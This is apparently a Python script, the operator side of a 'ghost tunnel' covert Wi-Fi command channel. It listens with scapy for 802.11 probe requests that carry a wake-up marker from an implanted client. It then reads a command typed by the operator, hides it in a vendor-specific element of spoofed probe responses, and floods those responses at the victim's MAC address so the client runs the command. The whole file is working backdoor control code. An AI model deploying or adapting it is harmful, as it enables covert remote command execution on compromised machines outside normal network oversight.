#coding:utf-8
from scapy.all import *
import binascii
import time

#设置ssid和监听设备名
netSSID = 'yunsle_ghost_tunnel'       #Network name here
iface = 'wlan0'         #Interface name here

#设置发送的帧数据
beacon = Dot11Beacon(cap='ESS+privacy')
essid = Dot11Elt(ID='SSID',info=netSSID, len=len(netSSID))
rsn = Dot11Elt(ID='RSNinfo', info=(
'\x01\x00'                 #RSN Version 1
'\x00\x0f\xac\x02'         #Group Cipher Suite : 00-0f-ac TKIP
'\x02\x00'                 #2 Pairwise Cipher Suites (next two lines)
'\x00\x0f\xac\x04'         #AES Cipher
'\x00\x0f\xac\x02'         #TKIP Cipher
'\x01\x00'                 #1 Authentication Key Managment Suite (line below)
'\x00\x0f\xac\x02'         #Pre-Shared Key
'\x00\x00'))               #RSN Capabilities (no extra capabilities)


#处理控制函数
def handle(packet):
    dot = packet.getlayer(Dot11)
    if dot!=None and dot.type==0 and dot.subtype==4:
        data=str(packet)
        if data.find("command")>=0:
            # packet.show()
            print "#wake up#\n"
            #获取上线被控端的MAC地址
            ct_addr2 = packet.addr2
            #要执行的命令
            cmd = raw_input("input the command to excute:\n")
            # cmd = "cmd /c notepad"
            #处理命令编码
            cmd_b = ""
            for i in cmd:
                cmd_b += binascii.a2b_hex(hex(ord(i))[2:4])
            print cmd_b
            payload = Dot11Elt(ID=221, info=('\x63\x63\x63'+cmd_b))

            #beacon_dot11 = Dot11(type=0, subtype=5, addr1=ct_addr2,
            #addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33')
            response_dot11 = Dot11(subtype=5, addr1=ct_addr2,
            addr2='22:22:22:22:22:22', addr3='33:33:33:33:33:33',SC=22222)

            
            #beacon_frame = RadioTap()/beacon_dot11/beacon/essid/rsn/payload
            response_frame = RadioTap()/response_dot11/Dot11ProbeResp()/Dot11Elt(ID='SSID', info="yunsle_ghost_tunnel")/payload
            #response_frame.show()
            for i in range(0,3):
                sendp(response_frame, iface=iface, count=300)
            exit(1)
if __name__ == "__main__":
    print "waiting for wake up......."
    #监听函数
    sniff(iface=iface, prn=handle)